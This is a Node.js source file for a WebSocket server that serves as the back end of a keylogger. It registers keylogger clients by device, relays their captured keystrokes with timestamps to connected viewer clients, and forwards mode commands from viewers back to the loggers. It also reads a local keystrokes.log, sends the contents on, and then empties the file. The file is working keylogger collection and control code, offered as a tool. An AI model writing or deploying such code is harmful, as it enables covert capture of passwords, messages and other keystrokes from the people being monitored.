import { WebSocketServer } from "ws";
import fs from "fs";
import path from "path";

const wss = new WebSocketServer({ port: 6699 }, () => {
  console.log("WebSocket server started on ws://localhost:6699");
});

let frontendClients = [];
let keyloggerClients = [];
const logPath = path.join(process.cwd(), "keystrokes.log");

function getDevices() {
  return keyloggerClients
    .map((c) => c._device)
    .filter(Boolean);
}

function broadcastStatus() {
  const status = JSON.stringify({
    type: "status",
    clientConnected: keyloggerClients.length > 0,
    devices: getDevices(),
  });
  frontendClients.forEach((client) => {
    if (client.readyState === WebSocket.OPEN) {
      client.send(status);
    }
  });
}

wss.on("connection", (ws) => {
  console.log("New WebSocket connection established.");
  ws._clientType = null;

  ws.on("message", (message) => {
    console.log("Received message:", message);

    let parsedMessage;
    try {
      parsedMessage = JSON.parse(message);
    } catch (e) {
      console.error("Invalid message format:", e);
      return;
    }

    // Identify client type on first message
    if (!ws._clientType) {
      if (parsedMessage.mode) {
        ws._clientType = "frontend";
        frontendClients.push(ws);
        ws.send(JSON.stringify({
          type: "status",
          clientConnected: keyloggerClients.length > 0,
          devices: getDevices(),
        }));
        // Fall through so the initial mode is forwarded to keyloggers.
      } else {
        ws._clientType = "keylogger";
        ws._device = null;
        keyloggerClients.push(ws);
        broadcastStatus();
      }
    }

    // Keylogger hello / device registration
    if (ws._clientType === "keylogger" && parsedMessage.type === "hello" && parsedMessage.device) {
      ws._device = parsedMessage.device;
      broadcastStatus();
      return;
    }

    // Forward mode changes from frontend to all keylogger clients
    if (ws._clientType === "frontend" && parsedMessage.mode) {
      const modeMsg = JSON.stringify({ mode: parsedMessage.mode });
      keyloggerClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(modeMsg);
        }
      });
      return;
    }

    // Forward keylogger data to all frontend clients
    if (ws._clientType === "keylogger") {
      if (parsedMessage.type === "exit") {
        const exitMsg = JSON.stringify({
          type: "exit",
          timestamp: parsedMessage.timestamp,
          device: ws._device || null,
        });
        frontendClients.forEach((client) => {
          if (client.readyState === WebSocket.OPEN) {
            client.send(exitMsg);
          }
        });
        return;
      }
      const serverTimestamp = Date.now() / 1000;
      frontendClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({
            ...parsedMessage,
            serverTimestamp,
            device: ws._device || null,
          }));
        }
      });
    }
  });

  ws.on("close", () => {
    console.log("WebSocket connection closed.");
    if (ws._clientType === "frontend") {
      frontendClients = frontendClients.filter((c) => c !== ws);
    } else if (ws._clientType === "keylogger") {
      keyloggerClients = keyloggerClients.filter((c) => c !== ws);
      broadcastStatus();
    }
  });

  ws.on("error", (error) => {
    console.error("WebSocket error:", error);
  });
});

fs.watch(logPath, (eventType) => {
  if (eventType === "change" && fs.existsSync(logPath)) {
    const fileContent = fs.readFileSync(logPath, "utf8");

    // Process the log file for structured view
    const structuredContent = fileContent
      .split("\n")
      .filter((line) => line.trim() !== "")
      .map((line) => {
        const match = line.match(/\[(.*?)\] (.*)/);
        if (match) {
          return { timestamp: match[1], content: match[2] };
        }
        return { raw: line };
      });

    // Only broadcast if there is actual content
    if (structuredContent.length > 0) {
      frontendClients.forEach((client) => {
        if (client.readyState === WebSocket.OPEN) {
          client.send(JSON.stringify({ mode: "structured", data: structuredContent }));
        }
      });
    }

    fs.writeFileSync(logPath, "", "utf8"); // Clear the log file after sending
  }
});
